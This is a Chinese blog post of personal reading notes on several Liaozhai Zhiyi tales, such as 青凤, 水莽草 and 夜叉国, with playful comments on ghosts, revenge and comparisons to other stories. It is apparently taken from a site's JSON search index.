《青凤》中的耿生，是在狂得可以。当他晚上读书时，有个面黑如漆的鬼披着头发走进来，一直瞪耿生看。耿生也不害怕，直接用墨把脸涂黑了也瞪着那个鬼，最后鬼只好惭愧而去。耿生此举，是在令人排案叫绝：所谓来而不往非礼也，你不是黑么，我比你更黑，你瞪我，那我也瞪你，看你还能怎么样。终于，鬼都拿他没办法。同样，《妖术》中的于公也不怕鬼，不过于公的身体素质好一些，能和那卜者\"召唤\"出来的巨鬼搏斗。其中描写他们搏斗的那一节颇有武侠小说的味道。倘若耿生有相当好的功夫，看见鬼时掏把刀出来，说：\"汝面皮黑，宜制墨。\"保管让鬼屁滚尿流而出，岂不快哉！ 《水莽草》讲的是鬼找替身的故事。说一个姓祝的书生被女鬼寇三娘找做了替身，祝生死后\"甚恨之\"，打听到三娘已经投了胎，于是\"驰去，强捉之来\"，最后还讨了三娘做老婆，小日子过得还不错。同样讲到做了鬼还要报仇的是《董生》，董生被一只狐狸迷惑致死后，到阎王那里告了狐狸一状，最后狐狸也没了好下场。这让我有个想法：人不应该怕鬼。就算被鬼给弄死了，还是可以到下面去报复他，不是常说\"我做了厉鬼也不放过你\"么？ 《九山王》则是一篇狐狸报复人的故事，该狐狸和金庸小说中的飞天狐狸有相似之处，难怪机智狡黠皆以狐狸著称。九山王中的老胡为报李生的灭门之仇，撺掇李生发动叛乱，最后李生一家被朝廷诛灭。飞天狐狸也是一直协助吴三桂准备叛乱，不同的是，飞天狐狸却被天下人误会，最后死在自己兄弟手中，诚可痛哉。由是观之，报仇十年不晚之君子，非大智大勇只认不可为也。大智者，谋全局而不谋一域，谋万世而不谋一时；大勇者，忍辱负重，甘当天下唾骂也！ 《张老相公》说的也是报仇的故事。张老相公在给女儿办嫁妆时，妻子女儿都给大鳖吃了。张老相公\"悼恨欲死\"，决心报仇。于是登金山，向和尚打听鳖的情况，谁知这些和尚一个个贪生怕死，为求一时安宁，不惜破戒宰杀牛羊来祭祀大鳖，全无我不入地狱谁入地狱之气概，颇有割地赂秦之古风。传说当初佛祖有割肉喂鹰之举，可能和尚的蠢就是他传下来的。话说回来，张老相公最后烧了百多斤铁，当成祭祀的牛羊喂了那鳖，从此除了一害。这方法让我想起了小时候看的一篇童话故事，好像是两个小孩把烧红的秤砣当水饺喂了一只熊。类似的还有《佣兵天下》中大青山冬天打猎用的方法。人的机智当真为只会吃的畜生所不及的。和尚把大鳖当成神，而张老相公却轻易的灭了它，盖神之为神，人神之耳！ 《夜叉国》倒像一篇游记。该篇说的是商人徐某被海风吹到了一个陌生的国度，那里的人相貌凶恶，吃生肉。刚上岸的时候徐某也差点给他们吃了，好歹徐某也是文明人，有的是夜叉们见不到的好东西，徐某先拿干粮贿赂夜叉，进而煮肉给夜叉吃，慢慢的竟然和夜叉们\"聚处如家人\"，还娶了个夜叉老婆。这和我以前看的《辛巴达游记》有着相似之处，不过辛巴达到的是人的国度，给人造的是马鞍而已。话说徐某还是想回故土，于是趁母夜叉外出时，带着和母夜叉生的一个儿子乘船回去了。看到这里，不禁想到很久以前看的一个故事，说一个男人被一个女野人抓去做了丈夫，还生了一个孩子，结果在男人逃走的时候，野人把孩子撕成两半，扔了一般给男人。但那母夜叉倒是很开明，最后带着孩子跟徐某一起回了大陆，只是\"恨其不谋\"而已。故事的结局是皆大欢喜，母夜叉和儿女们在战场上建功立业，荣华无限。最妙的是蒲松龄最后来了一句：\"家家床头有个夜叉在\"，想来蒲公亦然。","tags":"杂七杂八","url":"http://www.vmetu.com/blog/liao-zhai-zhi-yi-bi-ji.html","loc":"http://www.vmetu.com/blog/liao-zhai-zhi-yi-bi-ji.html"}]};